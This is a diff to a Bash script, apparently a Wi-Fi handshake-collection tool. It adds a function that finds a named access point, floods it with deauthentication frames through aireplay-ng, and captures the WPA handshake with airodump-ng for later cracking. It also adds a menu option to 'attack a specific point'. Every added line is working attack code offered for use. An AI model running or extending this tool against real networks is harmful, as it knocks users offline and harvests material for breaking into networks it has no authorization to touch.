@@ -130,9 +130,42 @@ active() {
   active
 }
 
+attackSpecific(){
+           trap 'cleanup; getparams' EXIT
+           printf "Enter SSID: \nEnter: "
+           read;
+           SSID=${REPLY}
+           timeout 10 airodump-ng -w /home/kali/hscollector/shakesCollector $interface </dev/null >/dev/null 
+           while IFS=";" read -r id NetType ESSID BSSID Info Channel Cloaked Encryption Decrypted MaxRate MaxSeenRate Beacon LLC Data Crypt Weak Total Carrier Encoding FirstTime LastTime BestQuality BestSignal; do        
+                  if [[ $BSSID == "BSSID" ]];then
+                          continue
+                  fi
+                  
+                  if [[ $ESSID == $SSID ]]
+                  then
+                          printf "\033[32mFind this AP\033[0m\n"
+                          printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
+                          iwconfig $interface channel $Channel
+                          aireplay-ng -a $BSSID -0 10 $interface &
+                          airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &>/dev/null &
+                          airodumpPID=`echo $!`
+                          sleep 30
+                          echo "airodumpPID:"$airodumpPID
+                          kill -9 $airodumpPID
+                          checkHandshakes
+                          rm /home/kali/hscollector/shakes-01.* >/dev/null
+                  else
+                        printf "\033[31mNo this AP\033[0m\n"
+                        continue
+                  fi                 
+            done < /home/kali/hscollector/shakesCollector-01.kismet.csv
+            rm /home/kali/hscollector/shakes* &>/dev/null
+
+}
+
 getparams(){
         printf "Please select an action:\n"
-        printf "1) Start active attack\n2) Start passive attack\n3) Get crack results\nEnter: "
+        printf "1) Start active attack\n2) Start passive attack\n3) Get crack results\n4) Attack a specific poinе\nEnter: "
         read;
         re='^[0-9]+$'
         if ! [[ ${REPLY} =~ $re ]] || [[ ${REPLY} >3 ]]; then
